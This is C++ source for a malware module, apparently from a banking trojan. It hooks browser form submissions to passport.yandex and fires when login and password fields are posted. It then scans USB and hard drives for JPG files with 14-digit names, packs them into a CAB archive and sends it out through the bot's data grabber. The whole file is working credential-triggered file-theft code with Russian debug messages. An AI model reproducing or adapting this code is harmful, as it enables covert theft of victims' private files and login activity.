
#include "Modules.h"

#ifdef YandexH
//----------------------------------------------------------------------------

#include "PostDataGrabber.h"
#include "BotDebug.h"
#include "CabPacker.h"
#include "Inject.h"
#include "Loader.h"

namespace YANDEXSYSTEMS
{
	#include "DbgTemplates.h"
}

#define YADBG YANDEXSYSTEMS::DBGOutMessage<>

namespace YandexSearchJpg
{
	struct JpgCab
	{
		HCAB cab;
		int count; //количество добавленных файлов
	};


	static void FindJpg(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel )
	{
		JpgCab* jpgcab = (JpgCab*)Data;
		if( Search->nFileSizeLow > 80000 && Search->nFileSizeLow < 200000 )
		{
			int i = 0;
			//считаем количество цифр в файле
			while( Search->cFileName[i] >= '0' && Search->cFileName[i] <= '9' ) i++;
			if( i == 14  )
			{
				YADBG( "Yandex", "Нашли файл %s, %s", FileName, Search->cFileName );
				AddFileToCab( jpgcab->cab, FileName, Search->cFileName );
				jpgcab->count++;
			}
		}
	}


	DWORD WINAPI StartSearch(void*)
	{
		YADBG( "Yandex", "Старт поиска" );
		DWORD drives = (DWORD)pGetLogicalDrives();
		char drive[] = { 'C', ':', '\\', 0 };
		char nameCab[MAX_PATH];
		File::GetTempName(nameCab);
		JpgCab jpgcab;
		jpgcab.cab = CreateCab(nameCab);
		jpgcab.count = 0;
		if( jpgcab.cab != 0 )
		{
			//смотрим с последних дисков, так как там находятся флешки, чтобы успеть проверить до того как ее вытащат
			for( int b = 31; b >= 2; b-- )
			{
				if( drives & (1 << b) )
				{
					drive[0] = 'A' + b;
					int tp = (int)pGetDriveTypeA(drive);
					//смотрим только флешки и жесткие диски
					if( tp == DRIVE_REMOVABLE || tp == DRIVE_FIXED )
					{
						YADBG( "Yandex", "Ищем на диске %s", drive );
						SearchFiles( drive, "*.jpg", true, FA_ANY_FILES, (LPVOID)&jpgcab, FindJpg );
					}
				}
			}
			CloseCab(jpgcab.cab);
			if( jpgcab.count > 0 )
			{
				YADBG( "Yandex", "Найдено %d картинок", jpgcab.count );
				DataGrabber::SendCabDelayed( 0, nameCab, "yad" );
			}
			pDeleteFileA(nameCab);
		}
		YADBG( "Yandex", "Конец поиска" );
		return 0;
	}

	void PostReceiver( PostDataGrabber::ParamEvent& e )
	{
		if( WildCmp( (char*)e.data, "*login*passwd*" ) )
		{
			YADBG( "Yandex", "Запускаем поиск jpg файлов" );
			MegaJump(StartSearch);
		}
	}

	bool Init()
	{
		PostDataGrabber::Receiver* rv = PostDataGrabber::AddReceiver( "*passport.yandex*", PostReceiver );
		if( rv )
			return true;
		return false;
	}

};


//----------------------------------------------------------------------------
#endif
